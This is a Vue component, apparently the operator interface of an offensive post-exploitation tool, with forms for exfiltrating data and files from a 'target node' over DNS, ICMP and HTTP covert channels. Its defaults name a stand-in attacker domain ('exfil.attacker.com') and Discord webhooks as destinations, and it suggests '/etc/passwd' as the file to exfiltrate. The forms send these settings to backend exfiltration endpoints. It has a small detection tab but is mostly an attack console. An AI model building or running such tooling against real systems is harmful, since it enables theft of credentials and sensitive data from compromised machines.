<template>
  <div class="exfil-view">
    <div class="header">
      <h1>📤 Exfiltration</h1>
      <p class="subtitle">Data exfiltration via DNS, ICMP & HTTP covert channels</p>
    </div>

    <div class="tabs">
      <button v-for="tab in tabs" :key="tab.id" :class="['tab-btn', { active: activeTab === tab.id }]" @click="activeTab = tab.id">
        {{ tab.icon }} {{ tab.label }}
      </button>
    </div>

    <!-- Methods -->
    <div v-if="activeTab === 'methods'" class="tab-content">
      <div class="panel">
        <h2>Exfiltration Methods</h2>
        <div class="method-grid">
          <div v-for="m in methods" :key="m.id" class="method-card">
            <h3>{{ m.name }}</h3>
            <p>{{ m.description }}</p>
            <div class="method-meta">
              <span class="meta-item">Stealth: <strong>{{ m.stealth }}</strong></span>
              <span class="meta-item">Speed: <strong>{{ m.speed }}</strong></span>
            </div>
            <p class="requirements">Requires: {{ m.requirements }}</p>
          </div>
        </div>
      </div>
    </div>

    <!-- DNS Exfil -->
    <div v-if="activeTab === 'dns'" class="tab-content">
      <div class="panel">
        <h2>DNS Exfiltration</h2>
        <div class="form-group">
          <label>Target Node</label>
          <select v-model="dnsForm.node_id">
            <option value="">Select node...</option>
            <option v-for="node in nodes" :key="node.id" :value="node.id">{{ node.name }} ({{ node.host }})</option>
          </select>
        </div>
        <div class="form-group">
          <label>Data to Exfiltrate</label>
          <textarea v-model="dnsForm.data" rows="4" placeholder="Enter sensitive data..."></textarea>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label>Attacker Domain</label>
            <input v-model="dnsForm.domain" type="text" placeholder="exfil.attacker.com" />
          </div>
          <div class="form-group">
            <label>Encoding</label>
            <select v-model="dnsForm.encoding">
              <option value="base32">Base32 (Recommended)</option>
              <option value="base64">Base64</option>
              <option value="hex">Hex</option>
            </select>
          </div>
        </div>
        <button @click="runDNSExfil" :disabled="!dnsForm.node_id || !dnsForm.data || running" class="btn-primary">
          {{ running ? '⏳ Exfiltrating...' : '📤 Send via DNS' }}
        </button>
        <div v-if="result" :class="['status', result.success ? 'success' : 'error']">
          {{ result.success ? `Sent ${result.total_chunks} chunks (${result.data_size} bytes)` : result.error || result.output }}
        </div>
      </div>
    </div>

    <!-- ICMP Exfil -->
    <div v-if="activeTab === 'icmp'" class="tab-content">
      <div class="panel">
        <h2>ICMP Exfiltration</h2>
        <div class="form-group">
          <label>Target Node</label>
          <select v-model="icmpForm.node_id">
            <option value="">Select node...</option>
            <option v-for="node in nodes" :key="node.id" :value="node.id">{{ node.name }} ({{ node.host }})</option>
          </select>
        </div>
        <div class="form-group">
          <label>Data to Exfiltrate</label>
          <textarea v-model="icmpForm.data" rows="4" placeholder="Enter sensitive data..."></textarea>
        </div>
        <div class="form-group">
          <label>Attacker IP</label>
          <input v-model="icmpForm.target_ip" type="text" placeholder="10.0.0.1" />
        </div>
        <button @click="runICMPExfil" :disabled="!icmpForm.node_id || !icmpForm.data || !icmpForm.target_ip || running" class="btn-primary">
          {{ running ? '⏳ Exfiltrating...' : '📤 Send via ICMP' }}
        </button>
        <div v-if="result" :class="['status', result.success ? 'success' : 'error']">
          {{ result.success ? `Sent ${result.data_size} bytes via ICMP` : result.error || result.output }}
        </div>
      </div>
    </div>

    <!-- HTTP Exfil -->
    <div v-if="activeTab === 'http'" class="tab-content">
      <div class="panel">
        <h2>HTTP Exfiltration</h2>
        <div class="form-group">
          <label>Target Node</label>
          <select v-model="httpForm.node_id">
            <option value="">Select node...</option>
            <option v-for="node in nodes" :key="node.id" :value="node.id">{{ node.name }} ({{ node.host }})</option>
          </select>
        </div>
        <div class="form-group">
          <label>Data to Exfiltrate</label>
          <textarea v-model="httpForm.data" rows="4" placeholder="Enter sensitive data..."></textarea>
        </div>
        <div class="form-group">
          <label>Webhook URL</label>
          <input v-model="httpForm.webhook_url" type="text" placeholder="https://discord.com/api/webhooks/..." />
        </div>
        <button @click="runHTTPExfil" :disabled="!httpForm.node_id || !httpForm.data || !httpForm.webhook_url || running" class="btn-primary">
          {{ running ? '⏳ Exfiltrating...' : '📤 Send via HTTP' }}
        </button>
        <div v-if="result" :class="['status', result.success ? 'success' : 'error']">
          {{ result.success ? `Sent ${result.data_size} bytes via HTTP` : result.error || result.output }}
        </div>
      </div>
    </div>

    <!-- File Exfil -->
    <div v-if="activeTab === 'file'" class="tab-content">
      <div class="panel">
        <h2>File Exfiltration</h2>
        <div class="form-group">
          <label>Target Node</label>
          <select v-model="fileForm.node_id">
            <option value="">Select node...</option>
            <option v-for="node in nodes" :key="node.id" :value="node.id">{{ node.name }} ({{ node.host }})</option>
          </select>
        </div>
        <div class="form-group">
          <label>File Path</label>
          <input v-model="fileForm.file_path" type="text" placeholder="/etc/passwd" />
        </div>
        <div class="form-row">
          <div class="form-group">
            <label>Method</label>
            <select v-model="fileForm.method">
              <option value="dns">DNS</option>
              <option value="icmp">ICMP</option>
              <option value="http">HTTP</option>
            </select>
          </div>
          <div class="form-group" v-if="fileForm.method === 'dns'">
            <label>Domain</label>
            <input v-model="fileForm.domain" type="text" placeholder="exfil.attacker.com" />
          </div>
          <div class="form-group" v-if="fileForm.method === 'icmp'">
            <label>Attacker IP</label>
            <input v-model="fileForm.target_ip" type="text" placeholder="10.0.0.1" />
          </div>
          <div class="form-group" v-if="fileForm.method === 'http'">
            <label>Webhook URL</label>
            <input v-model="fileForm.webhook_url" type="text" placeholder="https://..." />
          </div>
        </div>
        <button @click="runFileExfil" :disabled="!fileForm.node_id || !fileForm.file_path || running" class="btn-primary">
          {{ running ? '⏳ Exfiltrating...' : '📤 Exfiltrate File' }}
        </button>
        <div v-if="result" :class="['status', result.success ? 'success' : 'error']">
          {{ result.success ? `File exfiltrated via ${result.method}` : result.error || result.output }}
        </div>
      </div>
    </div>

    <!-- Detection -->
    <div v-if="activeTab === 'detect'" class="tab-content">
      <div class="panel">
        <h2>Exfiltration Detection</h2>
        <div class="form-group">
          <label>Target Node</label>
          <select v-model="detectForm.node_id">
            <option value="">Select node...</option>
            <option v-for="node in nodes" :key="node.id" :value="node.id">{{ node.name }} ({{ node.host }})</option>
          </select>
        </div>
        <button @click="runDetection" :disabled="!detectForm.node_id || detecting" class="btn-primary">
          {{ detecting ? '⏳ Detecting...' : '🔍 Scan for Exfiltration' }}
        </button>
      </div>

      <div v-if="detectionResult" class="panel">
        <h3>Detection Results ({{ detectionResult.findings_count }} findings)</h3>
        <div v-for="f in detectionResult.findings" :key="f.type" class="finding-card">
          <span :class="['severity', f.severity]">{{ f.severity }}</span>
          <span class="finding-type">{{ f.type }}</span>
          <p>{{ f.description }}</p>
          <pre v-if="f.sample" class="sample">{{ f.sample }}</pre>
        </div>
        <div v-if="detectionResult.findings_count === 0" class="no-findings">
          ✅ No exfiltration indicators detected
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { api } from '../api/client'

const tabs = [
  { id: 'methods', label: 'Methods', icon: '📋' },
  { id: 'dns', label: 'DNS', icon: '🌐' },
  { id: 'icmp', label: 'ICMP', icon: '📡' },
  { id: 'http', label: 'HTTP', icon: '🔗' },
  { id: 'file', label: 'File', icon: '📁' },
  { id: 'detect', label: 'Detect', icon: '🔍' },
]

const activeTab = ref('methods')
const nodes = ref<any[]>([])
const methods = ref<any[]>([])
const running = ref(false)
const detecting = ref(false)
const result = ref<any>(null)
const detectionResult = ref<any>(null)

const dnsForm = ref({ node_id: '', data: '', domain: 'exfil.attacker.com', encoding: 'base32' })
const icmpForm = ref({ node_id: '', data: '', target_ip: '', encoding: 'hex' })
const httpForm = ref({ node_id: '', data: '', webhook_url: '', encoding: 'json' })
const fileForm = ref({ node_id: '', file_path: '', method: 'dns', domain: 'exfil.attacker.com', target_ip: '', webhook_url: '' })
const detectForm = ref({ node_id: '' })

onMounted(async () => {
  try {
    const [nodesRes, methodsRes] = await Promise.all([
      api.get('/nodes'),
      api.get('/exfil/methods'),
    ])
    nodes.value = Object.values(nodesRes.data || {})
    methods.value = methodsRes.data?.methods || []
  } catch (e) {
    console.error('Failed to load data', e)
  }
})

async function runDNSExfil() {
  running.value = true
  result.value = null
  try {
    result.value = (await api.post('/exfil/dns', dnsForm.value)).data
  } catch (e: any) {
    result.value = { success: false, error: e.response?.data?.detail || 'Failed' }
  } finally {
    running.value = false
  }
}

async function runICMPExfil() {
  running.value = true
  result.value = null
  try {
    result.value = (await api.post('/exfil/icmp', icmpForm.value)).data
  } catch (e: any) {
    result.value = { success: false, error: e.response?.data?.detail || 'Failed' }
  } finally {
    running.value = false
  }
}

async function runHTTPExfil() {
  running.value = true
  result.value = null
  try {
    result.value = (await api.post('/exfil/http', httpForm.value)).data
  } catch (e: any) {
    result.value = { success: false, error: e.response?.data?.detail || 'Failed' }
  } finally {
    running.value = false
  }
}

async function runFileExfil() {
  running.value = true
  result.value = null
  try {
    result.value = (await api.post('/exfil/file', fileForm.value)).data
  } catch (e: any) {
    result.value = { success: false, error: e.response?.data?.detail || 'Failed' }
  } finally {
    running.value = false
  }
}

async function runDetection() {
  detecting.value = true
  detectionResult.value = null
  try {
    detectionResult.value = (await api.post('/exfil/detect', detectForm.value)).data
  } catch (e: any) {
    detectionResult.value = { findings_count: 0, findings: [] }
  } finally {
    detecting.value = false
  }
}
</script>

<style scoped>
.exfil-view { padding: 20px; color: #e0e0e0; }
.header h1 { color: #00ff88; margin-bottom: 4px; }
.subtitle { color: #888; margin-bottom: 20px; }
.tabs { display: flex; gap: 4px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 8px; }
.tab-btn { padding: 8px 16px; background: #1a1a2e; border: 1px solid #333; color: #aaa; cursor: pointer; border-radius: 4px 4px 0 0; }
.tab-btn.active { background: #0f3460; color: #00ff88; border-color: #00ff88; }
.panel { background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 20px; margin-bottom: 16px; }
.panel h2 { color: #00ff88; margin-bottom: 16px; }
.method-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
.method-card { background: #0d1117; border: 1px solid #333; border-radius: 6px; padding: 16px; }
.method-card h3 { color: #00ff88; margin-bottom: 8px; }
.method-meta { display: flex; gap: 16px; margin: 8px 0; font-size: 0.9em; }
.meta-item { color: #888; }
.requirements { font-size: 0.85em; color: #ff8800; font-style: italic; }
.form-group { margin-bottom: 12px; }
.form-group label { display: block; margin-bottom: 4px; color: #aaa; }
.form-group input, .form-group select, .form-group textarea { width: 100%; padding: 8px; background: #0d1117; border: 1px solid #333; color: #e0e0e0; border-radius: 4px; font-family: monospace; }
.form-row { display: flex; gap: 12px; }
.form-row .form-group { flex: 1; }
.btn-primary { padding: 10px 20px; background: #00ff88; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
.btn-primary:hover:not(:disabled) { background: #00cc6a; }
.btn-primary:disabled { opacity: 0.5; }
.status { margin-top: 12px; padding: 8px; border-radius: 4px; }
.status.success { background: rgba(0, 255, 136, 0.1); border: 1px solid #00ff88; color: #00ff88; }
.status.error { background: rgba(255, 0, 0, 0.1); border: 1px solid #ff4444; color: #ff4444; }
.finding-card { background: #0d1117; border: 1px solid #333; border-radius: 6px; padding: 12px; margin-bottom: 8px; }
.severity { padding: 2px 8px; border-radius: 4px; font-size: 0.8em; text-transform: uppercase; }
.severity.critical { background: #ff4444; color: #fff; }
.severity.high { background: #ff8800; color: #000; }
.severity.medium { background: #ffaa00; color: #000; }
.severity.info { background: #00aaff; color: #000; }
.finding-type { margin-left: 8px; color: #888; }
.sample { background: #111; padding: 8px; border-radius: 4px; font-size: 0.85em; margin-top: 8px; overflow-x: auto; }
.no-findings { text-align: center; color: #00ff88; padding: 20px; }
</style>
